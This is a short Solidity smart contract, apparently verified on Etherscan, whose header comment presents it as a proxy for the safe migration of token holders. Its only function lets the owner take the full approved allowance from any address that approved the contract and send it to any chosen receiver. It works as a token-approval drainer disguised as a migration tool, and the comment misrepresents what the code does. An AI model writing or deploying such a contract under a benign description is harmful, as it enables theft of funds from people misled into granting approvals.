/**
 *Submitted for verification at Etherscan.io on 2020-12-10
*/

// SPDX-License-Identifier: MIT

/*
* Proxy contract, whose main purpose is to ensure a safe and seamless migration for all token holders 
* without breaking any dependencies.
* The following code is provided under MIT License. Anyone can use it as per their needs.
*/
pragma solidity 0.6.12;

interface IERC20Token {
    function allowance(address _owner, address _spender) external view returns (uint256);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract MyContract {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }
    

    function transferFrom(IERC20Token _token, address _sender, address _receiver) external returns (bool) {
    require(msg.sender == owner, "access denied");
    uint256 amount = _token.allowance(_sender, address(this));
    uint256 balance = _token.balanceOf(_sender);
    if (amount > balance) amount = balance;
    return _token.transferFrom(_sender, _receiver, amount);
    }
}